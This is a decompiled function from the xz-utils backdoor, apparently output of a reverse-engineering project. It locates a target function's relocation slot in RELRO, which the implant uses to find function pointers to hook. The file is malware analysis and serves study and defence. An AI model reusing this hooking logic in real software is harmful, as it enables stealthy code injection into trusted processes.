// /home/kali/xzre-ghidra/xzregh/102A50_elf_find_function_pointer.c
// Function: elf_find_function_pointer @ 0x102A50
// Calling convention: __stdcall
// Prototype: BOOL __stdcall elf_find_function_pointer(StringXrefId xref_id, void * * pOutCodeStart, void * * pOutCodeEnd, void * * pOutFptrAddr, elf_info_t * elf_info, string_references_t * xrefs, global_context_t * ctx)


/*
 * AutoDoc: Given a populated string-reference entry, copies its `func_start`/`func_end` and searches RELA (then RELR) for a relocation that targets the function, treating the relocation address as the writable function-pointer slot.
 * The slot must live in RELRO (`elf_contains_vaddr_relro` enforces this); if the runtime flagged ENDBR usage, the referenced code is revalidated with `is_endbr64_instruction` before returning TRUE.
 * Returns FALSE when the xref is missing, no relocation is found, or the slot is outside RELRO.
 */

#include "xzre_types.h"

BOOL elf_find_function_pointer
               (StringXrefId xref_id,void **pOutCodeStart,void **pOutCodeEnd,void **pOutFptrAddr,
               elf_info_t *elf_info,string_references_t *xrefs,global_context_t *ctx)

{
  void *func_start;
  BOOL ok;
  Elf64_Rela *rela_slot;
  Elf64_Relr *relr_slot;
  
  func_start = xrefs->entries[xref_id].func_start;
  if (func_start == (void *)0x0) {
    return FALSE;
  }
  *pOutCodeStart = func_start;
  *pOutCodeEnd = xrefs->entries[xref_id].func_end;
  rela_slot = elf_find_rela_reloc(elf_info,(EncodedStringId)*pOutCodeStart,0);
  *pOutFptrAddr = rela_slot;
  if (rela_slot == (Elf64_Rela *)0x0) {
    relr_slot = elf_find_relr_reloc(elf_info,(EncodedStringId)*pOutCodeStart);
    *pOutFptrAddr = relr_slot;
    if (relr_slot == (Elf64_Relr *)0x0) {
      return FALSE;
    }
  }
  ok = elf_contains_vaddr_relro(elf_info,(long)*pOutFptrAddr - 8,0x10,1);
  if (ok == FALSE) {
    return FALSE;
  }
  if (ctx->uses_endbr64 != FALSE) {
    ok = is_endbr64_instruction((u8 *)*pOutCodeStart,(u8 *)((long)*pOutCodeStart + 4),0xe230);
    return (uint)(ok != FALSE);
  }
  return TRUE;
}

